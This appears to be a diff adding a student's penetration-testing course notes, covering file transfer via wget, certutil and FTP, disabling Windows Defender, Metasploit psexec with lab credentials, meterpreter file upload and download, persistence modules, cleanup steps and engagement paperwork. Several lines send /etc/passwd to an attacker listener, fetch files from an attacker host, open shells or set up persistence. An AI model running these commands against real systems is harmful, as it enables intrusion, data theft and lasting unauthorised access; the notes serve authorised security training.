@@ -1,0 +1,92 @@
+We can post or send file contents from one machine to another using 'wget':
+
+We set up a netcat listener at our kali machine:
+$ nc -nvlp 8081
+
+On the other linux/windows machine, we can send the contents of anyfile to Kali
+$ wget --post-file=/etc/passwd [IP Of Kali]
+
+---------------------------
+
+We can turn off Windows Defender permanently on the Win 10 machines by going to "gpedit" > Administrative Tools >
+Windows Components > Windows Defender Antivirus > Look for the policy to turn it off, and Enable it.
+---------------------------
+
+We will use certutil for file transfers now, on Win 10.
+$ certutil -urlcache -f http://[kali ip]/file.txt file.txt
+
+Using FTP:
+
+In Kali
+$ pip install pyftpdlib
+$ python -m pyftpdlib -p 21
+
+In Windows:
+
+> ftp [kali ip]
+> user: anonymous
+> pass: anonymous
+Connected.
+----------------------------
+Using msfconsole
+msf > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > set rhosts 192.168.100.61
+rhosts => 192.168.100.61
+msf5 exploit(windows/smb/psexec) > set smbdomain marvel
+smbdomain => marvel
+msf5 exploit(windows/smb/psexec) > set smbpass Kawaninjazx6r
+smbpass => Kawaninjazx6r
+msf5 exploit(windows/smb/psexec) > set smbuser fcastle
+smbuser => fcastle
+msf5 exploit(windows/smb/psexec) > set target 2
+msf > run
+
+That will return a shell to that system.
+
+meterpreter > upload secrets.txt c:\\ -> That will upload the secrets.txt file to C: Drive in Windows.
+
+Also we can download from Win to our Kali machine:
+meterpreter > download c:\\secrets.txt secrets.txt
+[*] Downloading: c:\secrets.txt -> secrets.txt
+[*] Downloaded 9.00 B of 9.00 B (100.0%): c:\secrets.txt -> secrets.txt
+[*] download   : c:\secrets.txt -> secrets.txt
+
+
+-----------------------------
+Maintaining Access w/ Meterpreter
+Persistence Scripts
+meterpreter > run persistence -h -> Really dangerous module to run.
+msf > exploit/windows/local/persistence
+msf > exploit/windows/local/registry_persistence
+Scheduled Tasks
+msf > run scheduleme
+msf > run schtaskabuse
+Metsvc
+msf > run metsvc -A
+
+------------------------------
+From here, starts the Lab, please refer to "Pivoting_Lab" for instructions.
+------------------------------
+CLEANUP
+
+1- Remove all executable, scripts and temporary files from a compromised system. If possible use secure delete method for removing the files and folders
+2- Return to original values system settings and application configuration parameters if they were modified during the assessment
+3- Remove all backdoors and/or rootkits installed
+4- Remove any user accounts created for connecting back to compromise systems
+
+LEGAL/DOCUMENTS
+
+See the video for this. Is just an example of how it should look like.
+
+Sales:
+- Mutual NDA
+- Master Service Agreement (https://www.rapid7.com/legal/msa/)
+- Statement of Work (activities, deliverables, timelines)
+- Other: Sample Report, Recommendation Letters, etc.
+
+Before you test:
+- Rules of Engagement (CYA; Cover Your Ass).
+
+After you test:
+- Findings Report
+ 
